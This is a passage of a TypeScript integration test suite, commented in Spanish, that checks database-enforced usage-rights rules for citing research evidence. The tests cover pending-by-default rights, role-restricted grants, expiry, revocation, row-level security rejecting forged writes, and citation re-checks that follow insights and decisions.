import { afterAll, beforeAll, expect, it } from 'vitest';
import type { TransactionSql } from 'postgres';
import { cerrarPools, conUsuario, sql, sqlAdmin } from '@/lib/db';
import {
  adjuntarArchivo,
  aprobarItem,
  archivoParaDescarga,
  contenidoDeItem,
  crearItem,
  decidirDerechos,
  eliminarArchivo,
  ErrorCuraduria,
  listarBandeja,
  listarEvidencias,
  listarEvidenciaConDerechos,
  PAGINA_DERECHOS,
} from '@/lib/evidencia/evidencia.servicio';
import {
  agregarAfirmacion,
  agregarCita,
  crearInsight,
  ErrorInsight,
  insightsCitables,
  validarInsight,
} from '@/lib/insight/insight.servicio';
import { aprobarGate, marcarItem, ErrorMetodo } from '@/lib/metodo/metodo.servicio';
import { rechazarItem } from '@/lib/evidencia/evidencia.servicio';
import { gobernanzaDeProyecto } from '@/lib/metodo/gobernanza.servicio';
import { bytesABase64, MAX_ARCHIVOS_POR_ITEM } from '@/lib/evidencia/sanitizacion';
import { describeAuthz } from './helpers';

/**
 * SPEC-03 (resto) — derechos de uso BLOQUEANTES (RF-03.10, SYS-14), archivos adjuntos
 * (RF-03.1) y sanitización de la ingesta (RF-03.2). Todo lo que estos tests comprueban
 * se impone en la BASE: se verifica por el servicio y también por SQL crudo del rol de
 * aplicación, que es donde una regla escrita solo en la app se caería.
 */
/**
 * Deja una transacción ADMIN abierta después de ejecutar `fn`, y devuelve cómo cerrarla.
 * Es la única forma de comprobar un candado de verdad: hay que tener el conflicto EN
 * VUELO —commiteado ni bloquea ni prueba nada— mientras el otro camino intenta decidir.
 */
async function enVuelo(
  fn: (tx: TransactionSql) => Promise<void>,
): Promise<{ cerrar: () => Promise<void> }> {
  let listo!: () => void;
  const tomado = new Promise<void>((r) => {
    listo = r;
  });
  let liberar!: () => void;
  const puedeCerrar = new Promise<void>((r) => {
    liberar = r;
  });
  const terminada = sqlAdmin().begin(async (tx) => {
    await fn(tx);
    listo();
    await puedeCerrar;
  });
  await tomado;
  return {
    cerrar: async () => {
      liberar();
      await terminada;
    },
  };
}

/**
 * ¿La promesa sigue SIN resolverse pasado `ms`? Es cómo se comprueba que algo espera por
 * un candado: sin candado compartido, la operación resuelve en milisegundos porque su
 * lectura no choca con nada. Se enganchan los dos manejadores antes de esperar para que
 * un rechazo no quede sin capturar.
 */
async function sigueEsperando(p: Promise<unknown>, ms = 400): Promise<boolean> {
  let resuelta = false;
  const marcar = () => {
    resuelta = true;
  };
  p.then(marcar, marcar);
  await new Promise((r) => setTimeout(r, ms));
  return !resuelta;
}

describeAuthz('evidencia profunda: derechos bloqueantes, adjuntos y sanitización', () => {
  const marca = `prof-${crypto.randomUUID().slice(0, 8)}`;
  let ws = '';
  let wsB = '';
  let leadId = '';
  let disenadorId = '';
  let adminClienteId = '';
  let stakeId = '';
  /** Evidencia con derechos concedidos (ámbito cliente). */
  let evConDerechos = '';
  /** Evidencia con derechos pendientes: el caso del criterio de aceptación 3. */
  let evSinDerechos = '';
  let itemSinDerechos = '';
  /** Un ítem de checklist real donde se prueba la CITA. */
  let itemChecklist = '';
  let retoId = '';

  const dimensiones = {
    fecha: '2026-08-01',
    recoleccion: 'Entrevista 1:1',
    derivada: false,
    confianza: 'media' as const,
    consentimiento: false,
    confidencialidad: 'cliente' as const,
    segmentoIds: [],
  };

  const PDF = new Uint8Array([0x25, 0x50, 0x44, 0x46, 0x2d, 0x31, 0x2e, 0x37, 0x0a, 0x25]);

  beforeAll(async () => {
    const admin = sqlAdmin();
    const [w] = await admin`insert into workspace (nombre) values (${marca}) returning id`;
    ws = w!.id as string;
    const [wb] = await admin`insert into workspace (nombre) values (${marca + '-B'}) returning id`;
    wsB = wb!.id as string;

    for (const [alias, rol] of [
      ['lead', 'lead-boutique'],
      ['dis', 'disenador'],
      ['adminc', 'admin-cliente'],
      ['stake', 'stakeholder'],
    ] as const) {
      const [u] = await admin`insert into usuario (email, nombre, estado)
        values (${`${marca}-${alias}@test.demo`}, ${alias}, 'activo') returning id`;
      const id = u!.id as string;
      if (alias === 'lead') leadId = id;
      if (alias === 'dis') disenadorId = id;
      if (alias === 'adminc') adminClienteId = id;
      if (alias === 'stake') stakeId = id;
      await admin`insert into miembro (workspace_id, usuario_id, nombre, email, rol)
        values (${ws}, ${id}, ${alias}, ${`${marca}-${alias}@test.demo`}, ${rol})`;
    }

    // Un proyecto con método instanciado: es donde vive la superficie de CITA
    // (checklist_item cumplido exige evidencia real enlazada).
    const [svc] = await admin`insert into servicio (workspace_id, nombre, creado_por)
      values (${ws}, ${marca + ' Servicio'}, ${leadId}) returning id`;
    const [reto] = await admin`insert into reto
      (workspace_id, servicio_ancla_id, codigo, titulo, estado, origen, creado_por)
      values (${ws}, ${svc!.id as string}, 'R-90', 'Reto derechos', 'activo', 'peticion-cliente', ${leadId})
      returning id`;
    retoId = reto!.id as string;
    const [proy] = await admin`insert into proyecto (workspace_id, reto_id, codigo, titulo, creado_por)
      values (${ws}, ${reto!.id as string}, 'P-90', 'Proyecto derechos', ${leadId}) returning id`;
    const proyectoId = proy!.id as string;
    await admin`insert into etapa_instancia (workspace_id, proyecto_id, numero, nombre)
      values (${ws}, ${proyectoId}, 1, 'Investigación')`;
    const [gate] = await admin`insert into gate_instancia
      (workspace_id, proyecto_id, numero, rol_aprobador)
      values (${ws}, ${proyectoId}, 1, 'lead-boutique') returning id`;
    const [ci] = await admin`insert into checklist_item (workspace_id, gate_id, orden, texto)
      values (${ws}, ${gate!.id as string}, 0, 'Evidencia primaria suficiente') returning id`;
    itemChecklist = ci!.id as string;
  });

  afterAll(async () => {
    const admin = sqlAdmin();
    const wss = [ws, wsB].filter((id) => id !== '');
    if (wss.length > 0) {
      await admin`delete from evento_dominio where workspace_id in ${admin(wss)}`;
      await admin`delete from checklist_item where workspace_id in ${admin(wss)}`;
      await admin`delete from arquetipo_evidencia where workspace_id in ${admin(wss)}`;
      await admin`delete from arquetipo where workspace_id in ${admin(wss)}`;
      await admin`delete from cita where workspace_id in ${admin(wss)}`;
      await admin`delete from contradiccion where workspace_id in ${admin(wss)}`;
      await admin`delete from afirmacion where workspace_id in ${admin(wss)}`;
      // decision_insight y decision cuelgan del insight: se borran antes que él.
      await admin`delete from decision_insight where workspace_id in ${admin(wss)}`;
      await admin`delete from decision where workspace_id in ${admin(wss)}`;
      await admin`delete from insight where workspace_id in ${admin(wss)}`;
      await admin`delete from gate_instancia where workspace_id in ${admin(wss)}`;
      await admin`delete from etapa_instancia where workspace_id in ${admin(wss)}`;
      await admin`delete from archivo_importado where workspace_id in ${admin(wss)}`;
      await admin`delete from item_importacion where workspace_id in ${admin(wss)}`;
      await admin`delete from derecho_uso where workspace_id in ${admin(wss)}`;
      await admin`delete from evidencia where workspace_id in ${admin(wss)}`;
      await admin`delete from fuente where workspace_id in ${admin(wss)}`;
      await admin`delete from proyecto where workspace_id in ${admin(wss)}`;
      await admin`delete from reto where workspace_id in ${admin(wss)}`;
      await admin`delete from servicio where workspace_id in ${admin(wss)}`;
      await admin`delete from miembro where workspace_id in ${admin(wss)}`;
      await admin`delete from workspace where id in ${admin(wss)}`;
    }
    await admin`delete from usuario where email like ${marca + '-%@test.demo'}`;
    await cerrarPools();
  });

  // ── Derechos: nacimiento fail-closed ──

  it('la evidencia curada NACE sin derechos: existe, se ve y no se puede citar', async () => {
    const item = await crearItem(leadId, {
      workspaceId: ws,
      titulo: 'Entrevista E-014 (sin consentimiento)',
      contenido: 'Se detuvo al pedirle la foto del documento.',
      tipoFuente: 'entrevista',
      referencia: 'grabaciones/E-014',
    });
    itemSinDerechos = item.itemId;
    const r = await aprobarItem(leadId, {
      workspaceId: ws,
      itemId: item.itemId,
      esEstadoActual: false,
      resumen: 'Explica el abandono',
      dimensiones,
    });
    evSinDerechos = r.evidenciaId;

    const [derecho] = await conUsuario(leadId, (tx) => tx`select estado, ambito, base, vence_en
      from derecho_uso where evidencia_id = ${evSinDerechos}`);
    expect(derecho?.estado).toBe('pendiente');
    expect(derecho?.ambito).toBe('interno');
    expect(derecho?.base).toBe('');

    const { evidencias } = await listarEvidencias(leadId, ws);
    const fila = evidencias.find((e) => e.id === evSinDerechos);
    expect(fila?.citable).toBe(false);
    expect(fila?.motivoBloqueo).toContain('derechos pendientes');
  });

  it('citar evidencia sin derechos se bloquea nombrando la dimensión que falta (SYS-14)', async () => {
    await expect(
      marcarItem(leadId, {
        workspaceId: ws,
        itemId: itemChecklist,
        accion: { tipo: 'cumplido', objetoClase: 'evidencia', objetoId: evSinDerechos },
      }),
    ).rejects.toThrow(/No puedes citar esta evidencia.*derechos pendientes/s);

    // Y por SQL CRUDO del rol de aplicación: el bloqueo no vive en el servicio sino en
    // el guard de la base — sin esto, la regla sería una convención de la app.
    await expect(
      conUsuario(leadId, (tx) => tx`update checklist_item
        set estado = 'cumplido', evidencia_id = ${evSinDerechos}
        where id = ${itemChecklist}`),
    ).rejects.toMatchObject({ code: 'DR001' });

    const [ci] = await conUsuario(leadId, (tx) => tx`select estado, evidencia_id
      from checklist_item where id = ${itemChecklist}`);
    expect(ci?.estado).toBe('pendiente');
    expect(ci?.evidencia_id).toBeNull();
  });

  it('solo lead-boutique o admin-cliente conceden: el diseñador cura pero no decide derechos', async () => {
    await expect(
      decidirDerechos(disenadorId, {
        workspaceId: ws,
        evidenciaId: evSinDerechos,
        decision: 'concedido',
        ambito: 'cliente',
        base: 'me parece bien',
        venceEn: null,
      }),
    ).rejects.toThrow(ErrorCuraduria);
    // Saltándose la capa 2: escribir `decidido_en` ya ni siquiera está en el grant (lo
    // sella el guard), así que el intento se corta antes de llegar a la política.
    await expect(
      conUsuario(disenadorId, (tx) => tx`update derecho_uso
        set estado = 'concedido', ambito = 'cliente', base = 'forzado',
            decidido_por = ${disenadorId}, decidido_en = now()
        where evidencia_id = ${evSinDerechos}`),
    ).rejects.toMatchObject({ code: '42501' });
    // Y sin tocar el sello tampoco: ahí la política de UPDATE no le alcanza ninguna fila.
    const filas = await conUsuario(disenadorId, (tx) => tx`update derecho_uso
      set estado = 'concedido', ambito = 'cliente', base = 'forzado',
          decidido_por = ${disenadorId}
      where evidencia_id = ${evSinDerechos}`);
    expect(filas.count).toBe(0);
  });

  it('los derechos no NACEN concedidos: el insert directo con concesión forjada se rechaza', async () => {
    const admin = sqlAdmin();
    const [fuente] = await admin`insert into fuente (workspace_id, tipo, titulo, creado_por)
      values (${ws}, 'nota', 'Fuente suelta', ${leadId}) returning id`;
    const [ev] = await admin`insert into evidencia
      (workspace_id, fuente_id, titulo, dimensiones, creado_por)
      values (${ws}, ${fuente!.id as string}, 'Evidencia suelta', '{}'::jsonb, ${leadId})
      returning id`;
    const evId = ev!.id as string;
    await expect(
      conUsuario(leadId, (tx) => tx`insert into derecho_uso
        (workspace_id, evidencia_id, estado, ambito, base, decidido_por, decidido_en, creado_por)
        values (${ws}, ${evId}, 'concedido', 'publico', 'inventada', ${leadId}, now(), ${leadId})`),
    ).rejects.toThrow(/row-level security/);
    // Y la atribución tampoco se falsifica al crearlo pendiente.
    await expect(
      conUsuario(leadId, (tx) => tx`insert into derecho_uso
        (workspace_id, evidencia_id, creado_por) values (${ws}, ${evId}, ${disenadorId})`),
    ).rejects.toThrow(/row-level security/);
    await admin`delete from evidencia where id = ${evId}`;
    await admin`delete from fuente where id = ${fuente!.id as string}`;
  });

  it('toda evidencia exige su registro de derechos: un insert crudo solitario aborta al commit', async () => {
    const [fuente] = await conUsuario(
      leadId,
      (tx) => tx`insert into fuente (workspace_id, tipo, titulo, creado_por)
        values (${ws}, 'nota', 'Fuente huérfana', ${leadId}) returning id`,
    );
    await expect(
      conUsuario(
        leadId,
        (tx) => tx`insert into evidencia (workspace_id, fuente_id, titulo, dimensiones, creado_por)
          values (${ws}, ${fuente!.id as string}, 'Sin derechos', '{}'::jsonb, ${leadId})`,
      ),
    ).rejects.toThrow(/registro de derechos/);
  });

  // ── Derechos: concesión, alcance, vigencia y revocación ──

  it('conceder ámbito interno NO alcanza a citar en el portal; conceder cliente, sí', async () => {
    const item = await crearItem(leadId, {
      workspaceId: ws,
      titulo: 'Estudio CX del proveedor',
      contenido: 'Abandono del 62% en verificación',
      tipoFuente: 'documento',
      referencia: 'carpeta/CX-2026',
    });
    const r = await aprobarItem(leadId, {
      workspaceId: ws,
      itemId: item.itemId,
      esEstadoActual: true,
      resumen: 'Línea base',
      dimensiones: { ...dimensiones, consentimiento: true },
    });
    evConDerechos = r.evidenciaId;

    // El orden es total: interno ⊂ cliente ⊂ publico. Interno no basta para el portal.
    await decidirDerechos(adminClienteId, {
      workspaceId: ws,
      evidenciaId: evConDerechos,
      decision: 'concedido',
      ambito: 'interno',
      base: 'Solo trabajo interno de la boutique',
      venceEn: null,
    });
    let fila = (await listarEvidencias(leadId, ws)).evidencias.find(
      (e) => e.id === evConDerechos,
    );
    expect(fila?.citable).toBe(false);
    expect(fila?.motivoBloqueo).toContain('interno');

    await decidirDerechos(leadId, {
      workspaceId: ws,
      evidenciaId: evConDerechos,
      decision: 'concedido',
      ambito: 'cliente',
      base: 'Cláusula 7 del contrato de servicios',
      venceEn: null,
    });
    fila = (await listarEvidencias(leadId, ws)).evidencias.find((e) => e.id === evConDerechos);
    expect(fila?.citable).toBe(true);
    expect(fila?.motivoBloqueo).toBeNull();

    // Ahora la cita sí entra, por el servicio y por el guard.
    await marcarItem(leadId, {
      workspaceId: ws,
      itemId: itemChecklist,
      accion: { tipo: 'cumplido', objetoClase: 'evidencia', objetoId: evConDerechos },
    });
    const [ci] = await conUsuario(leadId, (tx) => tx`select estado, evidencia_id
      from checklist_item where id = ${itemChecklist}`);
    expect(ci?.estado).toBe('cumplido');
    expect(ci?.evidencia_id).toBe(evConDerechos);
    await marcarItem(leadId, {
      workspaceId: ws,
      itemId: itemChecklist,
      accion: { tipo: 'pendiente' },
    });
  });

  it('los derechos caducan: una concesión vencida deja de habilitar la cita', async () => {
    const ayer = new Date(Date.now() - 86_400_000).toISOString().slice(0, 10);
    await decidirDerechos(leadId, {
      workspaceId: ws,
      evidenciaId: evConDerechos,
      decision: 'concedido',
      ambito: 'cliente',
      base: 'Consentimiento con vigencia de un año',
      venceEn: ayer,
    });
    const fila = (await listarEvidencias(leadId, ws)).evidencias.find(
      (e) => e.id === evConDerechos,
    );
    expect(fila?.citable).toBe(false);
    expect(fila?.motivoBloqueo).toContain('vencieron');
    await expect(
      conUsuario(leadId, (tx) => tx`update checklist_item
        set estado = 'cumplido', evidencia_id = ${evConDerechos}
        where id = ${itemChecklist}`),
    ).rejects.toMatchObject({ code: 'DR001' });

    // Se restablece para el resto de la suite.
    await decidirDerechos(leadId, {
      workspaceId: ws,
      evidenciaId: evConDerechos,
      decision: 'concedido',
      ambito: 'cliente',
      base: 'Cláusula 7 del contrato de servicios',
      venceEn: null,
    });
  });

  it('revocar es un camino real (el consentimiento se retira) y deja evento con el previo', async () => {
    const admin = sqlAdmin();
    await decidirDerechos(adminClienteId, {
      workspaceId: ws,
      evidenciaId: evConDerechos,
      decision: 'denegado',
      ambito: 'interno',
      base: 'El titular retiró el consentimiento',
      venceEn: null,
    });
    const fila = (await listarEvidencias(leadId, ws)).evidencias.find(
      (e) => e.id === evConDerechos,
    );
    expect(fila?.citable).toBe(false);
    expect(fila?.motivoBloqueo).toContain('retiró el consentimiento');

    const [evento] = await admin`select payload, actor_rol from evento_dominio
      where workspace_id = ${ws} and tipo = 'DerechosDenegados'
        and payload->>'evidenciaId' = ${evConDerechos}
      order by creado_en desc limit 1`;
    expect(evento).toBeDefined();
    expect(evento!.actor_rol).toBe('admin-cliente');
    expect((evento!.payload as { previo: { estado: string } }).previo.estado).toBe('concedido');

    // Y se puede volver a conceder: los derechos no son de sentido único.
    await decidirDerechos(leadId, {
      workspaceId: ws,
      evidenciaId: evConDerechos,
      decision: 'concedido',
      ambito: 'cliente',
      base: 'Nuevo consentimiento firmado',
      venceEn: null,
    });
    expect(
      (await listarEvidencias(leadId, ws)).evidencias.find((e) => e.id === evConDerechos)?.citable,
    ).toBe(true);
  });

  it('un derecho decidido nunca vuelve a «pendiente» ni acepta una concesión sin base', async () => {
    // Sin tocar el sello (que ya no está en el grant): lo detiene la política.
    await expect(
      conUsuario(leadId, (tx) => tx`update derecho_uso
        set estado = 'pendiente', base = '', decidido_por = null
        where evidencia_id = ${evConDerechos}`),
    ).rejects.toThrow(/row-level security/);
    await expect(
      conUsuario(leadId, (tx) => tx`update derecho_uso
        set estado = 'concedido', ambito = 'publico', base = '  ',
            decidido_por = ${leadId}
        where evidencia_id = ${evConDerechos}`),
    ).rejects.toThrow(/row-level security|check constraint/);
  });

  it('aislamiento: los derechos de otro workspace son invisibles (SYS-01/02)', async () => {
    const sinContexto = await sql()`select id from derecho_uso where workspace_id = ${ws}`;
    expect(sinContexto.length).toBe(0);
    const ajena = await listarEvidenciaConDerechos(leadId, wsB);
    expect(ajena.evidencias).toHaveLength(0);
  });

  // ── La MISMA regla en la otra superficie de cita: el insight ──

  it('citar evidencia bloqueada desde un insight se bloquea igual que en un gate', async () => {
    // El guard colgaba solo de `checklist_item`, pero la superficie de cita son DOS. La
    // política de `cita` mira rol, autoría e insight-propuesto — nunca derechos — así que
    // por /insights se persistía el `fragmento` COPIADO de material sin derechos, y esa
    // misma cita satisfacía el requisito que valida el insight (que luego es inmutable).
    const ins = await crearInsight(leadId, {
      workspaceId: ws,
      titulo: 'La verificación expulsa solicitantes',
      resumen: '',
    });
    const af = await agregarAfirmacion(leadId, {
      workspaceId: ws,
      insightId: ins.insightId,
      texto: 'El abandono se concentra al subir el documento',
      esHipotesis: false,
    });

    await expect(
      agregarCita(leadId, {
        workspaceId: ws,
        afirmacionId: af.afirmacionId,
        evidenciaId: evSinDerechos,
        fragmento: 'Testimonio literal del solicitante',
        localizacion: 'min 12:04',
      }),
    ).rejects.toThrow(/No puedes citar esta evidencia.*derechos pendientes/s);
    await expect(
      agregarCita(leadId, {
        workspaceId: ws,
        afirmacionId: af.afirmacionId,
        evidenciaId: evSinDerechos,
        fragmento: 'Testimonio literal del solicitante',
        localizacion: 'min 12:04',
      }),
    ).rejects.toThrow(ErrorInsight);

    // Por SQL CRUDO del rol de aplicación también: el bloqueo vive en el guard, no en el
    // servicio. Sin esto la regla sería una convención de la app en la otra puerta.
    await expect(
      conUsuario(leadId, (tx) => tx`insert into cita
        (workspace_id, afirmacion_id, evidencia_id, fragmento, localizacion, creado_por)
        values (${ws}, ${af.afirmacionId}, ${evSinDerechos}, 'robado', 'p. 1', ${leadId})`),
    ).rejects.toMatchObject({ code: 'DR001' });
    const nada = await conUsuario(leadId, (tx) => tx`select id from cita
      where afirmacion_id = ${af.afirmacionId}`);
    expect(nada).toHaveLength(0);

    // Y con derechos vigentes la cita entra con normalidad: el guard bloquea material sin
    // derechos, no la superficie.
    const cita = await agregarCita(leadId, {
      workspaceId: ws,
      afirmacionId: af.afirmacionId,
      evidenciaId: evConDerechos,
      fragmento: 'Abandono del 62% en verificación',
      localizacion: 'p. 14',
    });
    expect(cita.citaId).toBeTruthy();
  });

  it('el inventario de superficies de ENLACE está completo: guard o motivo, sin terceras vías', async () => {
    // Un solo guard compartido y un trigger por tabla: mientras la regla estuvo escrita
    // en una función con nombre de tabla, «añadir la siguiente superficie» significó
    // reescribirla — y por eso faltó. Este test fija el conjunto: quitar un trigger o
    // añadir una superficie tiene que ser un acto deliberado, no un descuido.
    const admin = sqlAdmin();
    const tablas = (
      await admin`select c.relname as tabla
        from pg_trigger t
        join pg_class c on c.oid = t.tgrelid
        join pg_proc p on p.oid = t.tgfoid
        where p.proname = 'evidencia_citable_guard' and not t.tgisinternal
        order by 1`
    ).map((f) => f.tabla as string);
    expect(tablas).toEqual([
      'arquetipo_evidencia',
      'checklist_item',
      'cita',
      'journey_nodo_evidencia',
    ]);

    // La otra mitad del inventario: de las NUEVE tablas con `evidencia_id`, las cuatro de
    // arriba llevan guard y las cinco restantes quedan fuera con motivo. Se comprueba
    // contra las columnas REALES para que una tabla nueva con `evidencia_id` obligue a
    // decidir en vez de heredar el silencio.
    const conEvidenciaId = (
      await admin`select c.table_name from information_schema.columns c
        join information_schema.tables t
          on t.table_name = c.table_name and t.table_schema = c.table_schema
        where c.column_name = 'evidencia_id' and c.table_schema = 'public'
          and t.table_type = 'BASE TABLE'
        order by 1`
    ).map((f) => f.table_name as string);
    const fueraConMotivo = [
      // Se registra y se muestra SIEMPRE (RF-03.9); la levanta cualquier miembro.
      'contradiccion',
      // ES el registro de derechos: guardarlo contra sí mismo no significa nada.
      'derecho_uso',
      // Parte de la DEFINICIÓN de la evidencia, escrita al curarla (derechos aún pendientes).
      'evidencia_segmento',
      // Conversación SOBRE la evidencia: es donde se discute el bloqueo, no un uso de él.
      'hilo_comentario',
      // El sello de la curaduría por el otro extremo: el alta, no un uso aguas abajo.
      'item_importacion',
    ];
    expect([...tablas, ...fueraConMotivo].sort()).toEqual(conEvidenciaId);

    // `arquetipo_evidencia` entró en 20260902200000 tras haberla dejado fuera por un
    // argumento equivocado: se creía apoyo interno que no se publica, y es respaldo
    // probatorio (confirmar exige enlace, G2 no pasa con arquetipos sin confirmar) cuyo
    // TÍTULO de evidencia se pinta en el tablero de gobernanza que lee todo el workspace.
    // `contradiccion` queda FUERA a propósito (RF-03.9: se registra y se muestra
    // siempre, jamás bloquea ni se oculta — que un stakeholder señale que algo no cuadra
    // es el punto del portal). Se comprueba que sigue siendo posible con evidencia
    // bloqueada: si alguien le colgara el guard, esto lo detiene.
    const [ins] = await conUsuario(
      leadId,
      (tx) => tx`select id from insight where workspace_id = ${ws} limit 1`,
    );
    await conUsuario(
      stakeId,
      (tx) => tx`insert into contradiccion
        (workspace_id, insight_id, evidencia_id, descripcion, creado_por)
        values (${ws}, ${ins!.id as string}, ${evSinDerechos},
                'El testimonio apunta a lo contrario', ${stakeId})`,
    );
    const registradas = await conUsuario(
      leadId,
      (tx) => tx`select id from contradiccion
        where workspace_id = ${ws} and evidencia_id = ${evSinDerechos}`,
    );
    expect(registradas).toHaveLength(1);
  });

  it('el picker dice lo mismo que el guard: un insight sin respaldo vigente sale bloqueado', async () => {
    // La app y la base tienen que sostener UNA sola verdad sobre si algo se puede citar.
    // El guard de suficiencia rechaza aprobar un gate cuyo ítem cita un insight cuya
    // afirmación se quedó sin cita con derechos vigentes; si el desplegable lo ofrece
    // como válido, el usuario elige y se come el rechazo después, sin explicación. Aquí
    // se comprueba que el picker reproduce ese mismo predicado.
    const admin = sqlAdmin();
    const [fuente] = await admin`insert into fuente (workspace_id, tipo, titulo, creado_por)
      values (${ws}, 'nota', 'Fuente del respaldo', ${leadId}) returning id`;
    const [ev] = await admin`insert into evidencia
      (workspace_id, fuente_id, titulo, dimensiones, creado_por)
      values (${ws}, ${fuente!.id as string}, 'Respaldo revocable', '{}'::jsonb, ${leadId})
      returning id`;
    const evRespaldo = ev!.id as string;
    await admin`insert into derecho_uso
      (workspace_id, evidencia_id, estado, ambito, base, decidido_por, decidido_en, creado_por)
      values (${ws}, ${evRespaldo}, 'concedido', 'cliente', 'Consentimiento vigente',
              ${leadId}, now(), ${leadId})`;

    const ins = await crearInsight(leadId, {
      workspaceId: ws,
      titulo: 'La verificación pierde a los independientes',
      resumen: '',
    });
    const af = await agregarAfirmacion(leadId, {
      workspaceId: ws,
      insightId: ins.insightId,
      texto: 'El 62% se detiene al cargar el documento',
      esHipotesis: false,
    });
    await agregarCita(leadId, {
      workspaceId: ws,
      afirmacionId: af.afirmacionId,
      evidenciaId: evRespaldo,
      fragmento: '62 de cada 100 se detienen',
      localizacion: 'p. 14',
    });
    await validarInsight(leadId, ws, ins.insightId);

    // Con el respaldo vigente, el insight se ofrece sin reservas.
    const antes = (await insightsCitables(leadId, ws)).insights.find(
      (i) => i.id === ins.insightId,
    );
    expect(antes?.citable).toBe(true);
    expect(antes?.motivoBloqueo).toBeNull();

    // Se retira el consentimiento del material que lo sostiene. El insight sigue
    // validado —es inmutable— pero ya no puede sostener la aprobación de un gate.
    await decidirDerechos(adminClienteId, {
      workspaceId: ws,
      evidenciaId: evRespaldo,
      decision: 'denegado',
      ambito: 'interno',
      base: 'El titular retiró el consentimiento',
      venceEn: null,
    });
    const despues = (await insightsCitables(leadId, ws)).insights.find(
      (i) => i.id === ins.insightId,
    );
    expect(despues?.citable).toBe(false);
    // El motivo NOMBRA la afirmación que se quedó sin respaldo: un genérico no dice qué
    // reparar, y reparar aquí es reconceder los derechos o citar otra evidencia.
    expect(despues?.motivoBloqueo).toContain('El 62% se detiene al cargar el documento');
    expect(despues?.motivoBloqueo).toContain('derechos vigentes');

    // Y el picker no se inventa el bloqueo: es exactamente lo que hace el guard. Se cita
    // el insight en un ítem —marcar sigue permitido— y el gate lo rechaza al aprobar.
    const [proy] = await admin`insert into proyecto (workspace_id, reto_id, codigo, titulo, creado_por)
      values (${ws}, ${retoId}, 'P-92', 'Proyecto insight sin respaldo', ${leadId}) returning id`;
    const proyectoId = proy!.id as string;
    await admin`insert into etapa_instancia (workspace_id, proyecto_id, numero, nombre)
      values (${ws}, ${proyectoId}, 1, 'Investigación')`;
    const [gate] = await admin`insert into gate_instancia
      (workspace_id, proyecto_id, numero, rol_aprobador)
      values (${ws}, ${proyectoId}, 1, 'lead-boutique') returning id`;
    const [ci] = await admin`insert into checklist_item (workspace_id, gate_id, orden, texto)
      values (${ws}, ${gate!.id as string}, 0, 'Interpretación sostenida') returning id`;
    await marcarItem(leadId, {
      workspaceId: ws,
      itemId: ci!.id as string,
      accion: { tipo: 'cumplido', objetoClase: 'insight', objetoId: ins.insightId },
    });
    await expect(
      aprobarGate(leadId, { workspaceId: ws, gateId: gate!.id as string }),
    ).rejects.toThrow(/ninguna cita con derechos vigentes/);

    // Reconceder desbloquea las dos caras a la vez, que es la prueba de que son una sola.
    await decidirDerechos(leadId, {
      workspaceId: ws,
      evidenciaId: evRespaldo,
      decision: 'concedido',
      ambito: 'cliente',
      base: 'Nuevo consentimiento firmado',
      venceEn: null,
    });
    expect(
      (await insightsCitables(leadId, ws)).insights.find((i) => i.id === ins.insightId)?.citable,
    ).toBe(true);
    const r = await aprobarGate(leadId, { workspaceId: ws, gateId: gate!.id as string });
    expect(r.numero).toBe(1);
  });

  it('citar una DECISIÓN no esquiva el re-chequeo: la cadena se sigue hasta sus insights', async () => {
    // El eslabón que faltaba. Un ítem que cita una decisión solo se comprobaba contra
    // `decision.estado`, y ese estado habla de REAPERTURAS (SYS-10), no de derechos: una
    // decisión perfectamente vigente puede apoyarse en insights cuyo respaldo se revocó,
    // así que el mismo razonamiento entraba por la puerta de al lado.
    const admin = sqlAdmin();
    const [fuente] = await admin`insert into fuente (workspace_id, tipo, titulo, creado_por)
      values (${ws}, 'nota', 'Fuente de la decisión', ${leadId}) returning id`;
    const [ev] = await admin`insert into evidencia
      (workspace_id, fuente_id, titulo, dimensiones, creado_por)
      values (${ws}, ${fuente!.id as string}, 'Respaldo de la decisión', '{}'::jsonb, ${leadId})
      returning id`;
    const evDecision = ev!.id as string;
    await admin`insert into derecho_uso
      (workspace_id, evidencia_id, estado, ambito, base, decidido_por, decidido_en, creado_por)
      values (${ws}, ${evDecision}, 'concedido', 'cliente', 'Consentimiento vigente',
              ${leadId}, now(), ${leadId})`;

    const ins = await crearInsight(leadId, {
      workspaceId: ws,
      titulo: 'El canal digital concentra el abandono',
      resumen: '',
    });
    const af = await agregarAfirmacion(leadId, {
      workspaceId: ws,
      insightId: ins.insightId,
      texto: 'El abandono se concentra en el canal digital',
      esHipotesis: false,
    });
    await agregarCita(leadId, {
      workspaceId: ws,
      afirmacionId: af.afirmacionId,
      evidenciaId: evDecision,
      fragmento: 'El 62% abandona en digital',
      localizacion: 'p. 4',
    });
    await validarInsight(leadId, ws, ins.insightId);

    const [proy] = await admin`insert into proyecto (workspace_id, reto_id, codigo, titulo, creado_por)
      values (${ws}, ${retoId}, 'P-93', 'Proyecto decisión', ${leadId}) returning id`;
    const proyectoId = proy!.id as string;
    await admin`insert into etapa_instancia (workspace_id, proyecto_id, numero, nombre)
      values (${ws}, ${proyectoId}, 1, 'Investigación')`;
    const [gate] = await admin`insert into gate_instancia
      (workspace_id, proyecto_id, numero, rol_aprobador)
      values (${ws}, ${proyectoId}, 1, 'lead-boutique') returning id`;
    const gateId = gate!.id as string;
    const [ci] = await admin`insert into checklist_item (workspace_id, gate_id, orden, texto)
      values (${ws}, ${gateId}, 0, 'Decisión tomada con respaldo') returning id`;
    const [dec] = await admin`insert into decision
      (workspace_id, proyecto_id, gate_id, tipo, titulo, fundamento, decidido_por)
      values (${ws}, ${proyectoId}, ${gateId}, 'diseno', 'Atacar la verificación digital',
              'El insight lo concentra ahí', ${leadId}) returning id`;
    await admin`insert into decision_insight (decision_id, insight_id, workspace_id)
      values (${dec!.id as string}, ${ins.insightId}, ${ws})`;
    await marcarItem(leadId, {
      workspaceId: ws,
      itemId: ci!.id as string,
      accion: { tipo: 'cumplido', objetoClase: 'decision', objetoId: dec!.id as string },
    });

    // Con el respaldo vigente el gate aprueba... pero primero se revoca, para probar que
    // es el DERECHO lo que lo detiene y no otra cosa.
    await decidirDerechos(adminClienteId, {
      workspaceId: ws,
      evidenciaId: evDecision,
      decision: 'denegado',
      ambito: 'interno',
      base: 'El titular retiró el consentimiento',
      venceEn: null,
    });
    // La decisión sigue VIGENTE: la comprobación que ya existía no ve nada raro.
    const [estado] = await conUsuario(leadId, (tx) => tx`select estado from decision
      where id = ${dec!.id as string}`);
    expect(estado!.estado).toBe('vigente');
    // Y el picker tiene que decir lo MISMO que el guard antes de que nadie elija: la
    // citabilidad de una decisión sale de su estado Y del respaldo vivo de cada insight
    // enlazado. Mirando solo `estado` la decisión salía habilitada, marcar el ítem tenía
